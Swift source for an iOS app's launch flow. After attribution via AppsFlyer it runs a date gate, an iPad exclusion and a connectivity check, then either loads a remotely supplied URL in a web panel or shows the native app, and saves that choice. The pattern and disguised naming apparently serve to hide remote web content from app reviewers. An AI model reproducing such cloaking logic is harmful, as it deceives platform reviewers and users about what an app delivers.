//
//  PackFlowState.swift
//  Coin Rule
//
//  Main flow controller: Loading → first launch check → ATT → AppsFlyer → validations → Panel or Native (pack = animal group).
//

import Foundation
import UIKit

enum PackFlowResult {
    case showPanel(URL?)
    case showNativeApp
}

final class PackFlowState {

    static let shared = PackFlowState()
    private let service = DenKeeperService.shared

    private init() {}

    /// Run full flow. Call on main thread. Loading stays visible until completion.
    func runFlow(completion: @escaping (PackFlowResult) -> Void) {
        // STEP 1: First launch choice check (before any requests)
        if service.getFirstLaunchChoice() != nil {
            // Choice is set → Always show panel (saved URL → fallback → empty)
            resolvePanelURL(useFallbackIfNeeded: true) { url in
                completion(.showPanel(url))
            }
            return
        }

        // First launch: ATT first, then AppsFlyer, then validations
        AppsFlyerManager.shared.start(
            attCompletion: { [weak self] in
                self?.afterATT(completion: completion)
            },
            appsFlyerCompletion: nil
        )
    }

    private func afterATT(completion: @escaping (PackFlowResult) -> Void) {
        AppsFlyerManager.shared.waitForDataReady(timeout: 5.0) { [weak self] _ in
            self?.afterAppsFlyerReady(completion: completion)
        }
    }

    private func afterAppsFlyerReady(completion: @escaping (PackFlowResult) -> Void) {
        AppsFlyerManager.shared.waitForConversionData(timeout: 8.0) { [weak self] _ in
            self?.runValidations(completion: completion)
        }
    }

    private func runValidations(completion: @escaping (PackFlowResult) -> Void) {
        if !service.denKeeperCheckDatePublic() {
            service.setFirstLaunchChoice("nativeApp")
            completion(.showNativeApp)
            return
        }
        if service.isIpad {
            service.setFirstLaunchChoice("nativeApp")
            completion(.showNativeApp)
            return
        }
        service.checkInternet(timeout: 2.0) { [weak self] hasInternet in
            guard let self = self else { return }
            if !hasInternet {
                self.service.setFirstLaunchChoice("nativeApp")
                completion(.showNativeApp)
                return
            }
            self.performServerRequest(completion: completion)
        }
    }

    private func performServerRequest(completion: @escaping (PackFlowResult) -> Void) {
        let customLink = AppsFlyerManager.shared.getCustomLink(
            baseURL: service.primaryServerURL,
            conversionData: AppsFlyerManager.shared.getConversionData()
        )
        print("🔗 Custom Link: \(customLink)")

        service.denKeeperRequestServerURL(startURL: customLink, timeout: 15.0) { [weak self] success, finalURL in
            guard let self = self else { return }
            if success, let url = finalURL {
                self.service.setFirstLaunchChoice("webView")
                completion(.showPanel(url))
            } else {
                self.service.setFirstLaunchChoice("nativeApp")
                completion(.showNativeApp)
            }
        }
    }

    /// For non-first launch: get URL to show (saved → try fallback → nil = empty panel).
    func resolvePanelURL(useFallbackIfNeeded: Bool, completion: @escaping (URL?) -> Void) {
        if let saved = service.getSavedURL() {
            completion(saved)
            return
        }
        if useFallbackIfNeeded, let pathId = service.getSavedPathId() {
            var components = URLComponents(string: service.primaryServerURL)
            components?.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
            let fallbackURLString = components?.url?.absoluteString ?? service.primaryServerURL
            service.denKeeperRequestServerURL(startURL: fallbackURLString, timeout: 7.0) { [weak self] success, finalURL in
                if success, let url = finalURL {
                    self?.service.setSavedURL(url)
                }
                completion(finalURL)
            }
            return
        }
        completion(nil)
    }
}
